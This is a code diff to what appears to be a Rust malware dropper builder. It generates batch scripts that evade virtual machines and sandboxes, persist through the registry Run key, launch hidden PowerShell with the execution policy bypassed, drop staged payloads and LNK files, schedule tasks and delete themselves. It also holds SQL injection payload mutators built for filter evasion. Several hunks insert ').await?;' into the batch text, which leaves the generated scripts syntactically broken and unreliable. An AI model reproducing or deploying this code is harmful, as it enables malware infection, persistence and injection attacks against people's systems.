@@ -446,7 +446,7 @@ pub fn build_anti_vm(ctx: &mut DropperContext) -> String {
     if !{ram_val}! LSS 2000 (
         echo [*] System resources verification failed (Code: 0x1002).
         ping -n 120 127.0.0.1 >nul
-    )
+    ).await?;
     REM [ Check 3: Virtualization Artifacts ]
     set "artifacts=VBOX VMWARE QEMU XEN VIRTUAL"
     for %%X in (%artifacts%) do (
@@ -455,7 +455,7 @@ pub fn build_anti_vm(ctx: &mut DropperContext) -> String {
             echo [*] Environment restricted. Pausing execution.
             ping -n 300 127.0.0.1 >nul
         )
-    )
+    ).await?;
     "#,
         uptime=uptime, boot=boot, now=now, ram=ram, ram_val=ram_val
     )
@@ -492,7 +492,7 @@ set "persist_path=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 reg query "%persist_path%" /v "{reg_name}" >nul 2>&1
 if errorlevel 1 (
     reg add "%persist_path%" /v "{reg_name}" /t REG_SZ /d "cmd /c start /min \"\" \"%%~dp0{ps1_name}\"" /f >nul
-)
+).await?;
 REM == Execute Payload ==
 echo [*] Starting background service...
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%%~dp0{ps1_name}" >nul 2>&1
@@ -527,7 +527,7 @@ set "{s3_var}=%~dp0{stage3_name}"
 
     for line in stage3_content.lines() {
         if !line.trim().is_empty() {
-             script.push_str(&format!("    echo {}\n", line.replace("%", "%%")));
+             script.push_str(&format!("    echo {}\n", line.replace('%', "%%")));
         } else {
              script.push('\n');
         }
@@ -603,7 +603,7 @@ set "{s2_var}=%~dp0{stage2_name}"
 
     for line in stage2_content.lines() {
         if !line.trim().is_empty() {
-            script.push_str(&format!("    echo {}\n", line.replace("%", "%%")));
+            script.push_str(&format!("    echo {}\n", line.replace('%', "%%")));
         } else {
             script.push('\n');
         }
@@ -667,14 +667,14 @@ pub fn generate_junk_comments() -> String {
 /// Escape special characters for BAT echo commands
 pub fn escape_bat_echo(content: &str) -> String {
     content.lines().map(|line| {
-        let escaped = line.replace("%", "%%")
-                          .replace("^", "^^")
-                          .replace("&", "^&")
-                          .replace("<", "^<")
-                          .replace(">", "^>")
-                          .replace("|", "^|")
-                          .replace("(", "^(")
-                          .replace(")", "^)");
+        let escaped = line.replace('%', "%%")
+                          .replace('^', "^^")
+                          .replace('&', "^&")
+                          .replace('<', "^<")
+                          .replace('>', "^>")
+                          .replace('|', "^|")
+                          .replace('(', "^(")
+                          .replace(')', "^)");
         format!("echo {}", escaped)
     }).collect::<Vec<_>>().join("\n")
 }
@@ -703,7 +703,7 @@ oLink.WindowStyle = 7
 oLink.Save"#,
         stage3_lnk_name = stage3_lnk_name,
         lnk_target = lnk_target,
-        lnk_args = lnk_args.replace("\"", "\"\"")
+        lnk_args = lnk_args.replace('"', "\"\"")
     );
 
     let task2_cmd = format!("cmd /c start /min \"\" \"%cd%\\{}\"", stage3_lnk_name);
@@ -731,7 +731,7 @@ if %errorlevel% neq 0 (
     echo [!] Task creation failed. Admin rights might be needed or schedule time invalid.
     echo [*] Fallback: Executing LNK immediately...
     start "" "{lnk_name}"
-)
+).await?;
 del "%~f0" >nul 2>&1
 "#,
         vbs_echo_lines = vbs_content.lines().map(|l| format!("echo {}", l)).collect::<Vec<_>>().join("\n"),
@@ -1193,13 +1193,12 @@ fn sql_comment_inject(payload: &str) -> Vec<String> {
     let keywords = ["SELECT", "UNION", "FROM", "WHERE", "OR", "AND", "ORDER", "INSERT", "UPDATE", "DELETE", "DROP"];
     let upper = payload.to_uppercase();
     for kw in &keywords {
-        if upper.contains(kw) {
-            if kw.len() >= 2 {
+        if upper.contains(kw)
+            && kw.len() >= 2 {
                 let mid = kw.len() / 2;
                 let split_kw = format!("{}/**/{}",  &kw[..mid], &kw[mid..]);
                 results.push(replace_case_insensitive(payload, kw, &split_kw));
             }
-        }
     }
 
     results.push(payload.replace("UNION", "/*!50000 UNION*/"));
@@ -1299,7 +1298,7 @@ fn sql_alternative_syntax(payload: &str) -> Vec<String> {
     if upper.contains("AND") {
         results.push(replace_case_insensitive(payload, "AND", "&&"));
     }
-    if upper.contains("=") {
+    if upper.contains('=') {
         results.push(payload.replace('=', " LIKE "));
         results.push(payload.replace('=', " REGEXP "));
     }
